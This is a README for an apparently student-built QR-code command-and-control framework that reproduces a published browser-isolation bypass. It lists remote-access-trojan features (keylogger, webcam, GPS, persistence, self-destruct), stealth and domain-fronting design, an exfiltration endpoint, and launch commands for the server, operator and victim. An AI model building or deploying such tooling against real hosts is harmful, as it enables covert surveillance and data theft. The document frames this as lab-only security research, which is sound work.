> ⚠️ **EDUCATIONAL SECURITY RESEARCH ONLY**
>
> This project reproduces a technique published by Mandiant (2024) for
> academic study. It is intended **solely for isolated lab environments**
> with explicit authorization. Unauthorized use is illegal. See
> [ETHICS.md](ETHICS.md) for full terms and published detection
> signatures.

[![CI — Security & Tests](https://github.com/Jeevan1725/cyberrecon/actions/workflows/ci.yml/badge.svg)](https://github.com/Jeevan1725/cyberrecon/actions/workflows/ci.yml)

# CyberRecon: QR Code-Based C2 Framework

Reproduction & defensive study of Mandiant's 2024 QR-C2 browser-isolation bypass.

## Team

- **Vekeshhari Rajasekar** (CH.SC.U4CYS23051)
- **R Jeevan** (CH.SC.U4CYS23036)
- **Guide:** Dr. S. Udhayakumar
- **Institution:** Amrita School of Computing, Amrita Vishwa Vidyapeetham, Chennai

## Overview

CyberRecon is a self-contained QR-Code-based Command & Control (C2)
framework that demonstrates how visually rendered QR codes can pass
through browser isolation filters as pixel data.

## Architecture

```
Operator CLI  ──►  C2 Server (Flask)  ──►  QR PNG  ──►  Victim Client
                       ▲                                      │
                       └───── HTTP POST /exfil ◄──────────────┘
```

## Features

- QR-based C2 channel (base64-JSON payload, Level-H error correction)
- 12 RAT feature commands (screenshot, webcam, keylogger, clipboard, GPS,
  process list, system info, file ops, persistence, self-destruct)
- Live Flask dashboard (victims, screenshots, keystrokes, GPS)
- Multi-layer fallback: TCP → HTTP → QR
- Optional AWS relay (domain fronting)
- AI agent (natural-language command parsing)

## Why Selenium (and Chrome)?

Mandiant's 2024 QR-C2 technique relies on a **real browser rendering
the QR image as pixels**. That pixel stream is what bypasses
browser-isolation products — they cannot strip what the user sees.

A plain `requests.get()` only downloads a PNG; it does NOT reproduce
the technique. Our client uses **Selenium + headless Chrome** to:

- Reproduce the actual browser rendering pipeline (pixel channel)
- Provide a real Chrome fingerprint (defeats headless-bot detection)
- Auto-grant camera / microphone permissions (some RBI products block
  dynamic media access before the QR renders)

**Client prerequisite:** Google Chrome must be installed on the victim
host. The client falls back to direct `requests`-based fetch if Chrome
is unavailable — functionality preserved, stealth reduced.

**Docker:** the provided `Dockerfile` installs Chrome automatically.

## Installation

```bash
python -m venv venv
source venv/bin/activate     # Windows: .\venv\Scripts\activate
pip install -r requirements.txt
```

### System dependency (for QR decoding on victim)

- **Ubuntu/Debian:** `sudo apt install libzbar0`
- **macOS:** `brew install zbar`
- **Windows:** included in the `opencv-python` wheel

## Usage

```bash
# Terminal 1 — C2 server
export CYBERRECON_OPERATOR_TOKEN=$(python -c "import secrets;print(secrets.token_hex(16))")
python main.py --mode c2

# Terminal 2 — Operator CLI (paste token from above)
python main.py --mode operator --token <TOKEN>

# Terminal 3 — Victim (in lab VM)
python main.py --mode rat --c2-host <C2_IP>

# Browser — Dashboard
open http://localhost:8443/dashboard
```

## File Structure

```
cyberrecon/
├── c2_server.py          # Flask C2 + QR encoder + dashboard
├── rat_client.py         # Victim client (12 features)
├── operator_cli.py       # Operator console
├── aws_relay.py          # Optional traffic relay
├── main.py               # Unified launcher
├── config.py             # Global configuration
├── ai_agent.py           # NL command parser
├── modules/              # RAT feature modules
│   ├── keylogger.py
│   ├── screenshot.py
│   ├── webcam.py
│   ├── gps.py
│   ├── stealth.py
│   └── persistence.py
├── tests/                # Pytest suite
├── docs/                 # Reports and diagrams
├── reports/              # SAST evidence
├── Dockerfile
├── bandit.yaml
├── pyproject.toml
└── requirements.txt
```

## SAST & Security Testing

**CodeQL note:** GitHub CodeQL default setup requires GitHub Advanced
Security (GHAS) for private repositories. Because this repo is
intentionally private (contains security research tooling), we use
**local SAST tools** instead — equivalent Python coverage with
file-based evidence artifacts:

| Tool | Purpose | Output |
|------|---------|--------|
| **Bandit** | Python SAST (CWE-focused) | `reports/bandit*.json` |
| **Semgrep** | Pattern SAST (OWASP Top 10) | `reports/semgrep*.json` |
| **pip-audit** | Dependency CVEs (SCA) | `reports/pipaudit.json` |
| **Ruff** | Python linter | `reports/ruff.txt` |

**Final state (2026-09-30):**

- Bandit: 25 → 17 findings, **0 HIGH** (was 4)
- Semgrep: 5 → **0 findings**
- pip-audit: **0 CVEs**
- Ruff: 131 → **0 errors**

Full report: [docs/report/08-security-testing.md](docs/report/08-security-testing.md).

## CI/CD

- **[.github/workflows/ci.yml](.github/workflows/ci.yml)** — Runs
  Bandit, pip-audit, Ruff, and pytest on every push to `main` and every
  PR. Report artifacts are uploaded.
- **[.github/workflows/cd.yml](.github/workflows/cd.yml)** — Builds a
  Docker image and creates a GitHub Release when a `v*` tag is pushed.

## Threat Model

See [docs/report/06-threat-model.md](docs/report/06-threat-model.md)
for STRIDE analysis and MITRE ATT&CK mapping.

## License

See [LICENSE](LICENSE) — MIT with research clause.

## Acknowledgments

- Amrita School of Computing, Chennai
- Department of CSE — Cyber Security
- Guide: Dr. S. Udhayakumar